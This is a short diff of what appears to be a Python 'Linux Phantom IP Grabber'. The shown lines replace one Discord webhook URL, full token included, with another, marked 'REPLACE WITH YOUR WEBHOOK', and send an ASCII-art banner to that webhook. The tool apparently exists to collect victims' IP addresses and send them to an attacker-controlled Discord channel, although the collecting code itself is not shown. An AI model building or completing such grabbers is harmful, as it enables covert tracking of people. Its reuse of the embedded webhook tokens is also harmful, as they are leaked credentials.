@@ -38,7 +38,7 @@ def f(a):
 
 def main():
     a = "```diff\n-█░░ █ █▄░█ █░█ ▀▄▀   +█▀█ █░█ ▄▀█ █▄░█ ▀█▀ █▀█ █▀▄▀█ \n-█▄▄ █ █░▀█ █▄█ █░█   +█▀▀ █▀█ █▀█ █░▀█ ░█░ █▄█ █░▀░█ \n+                        +Linux Phantom IP Grabber ©+\n```"
-    h = "https://discord.com/api/webhooks/1136811328212828190/qUki18tSz3FCU7-wB6yYPusiGmPRlFuhSQsgF68eJ_foEbZnuwXhBI83Mb5hqufNIa9N"  # REPLACE WITH YOUR WEBHOOK
+    h = "https://discord.com/api/webhooks/1368510731519004792/-7L6F-3RVzOSAiZdgv4GQEDHG8voCKJ6p-CwsNSPpWR5lWqqlfS15_xCcj0XHrV0gIDf"  # REPLACE WITH YOUR WEBHOOK
     j = Webhook(h)
     j.send(a)
     time.sleep(3)
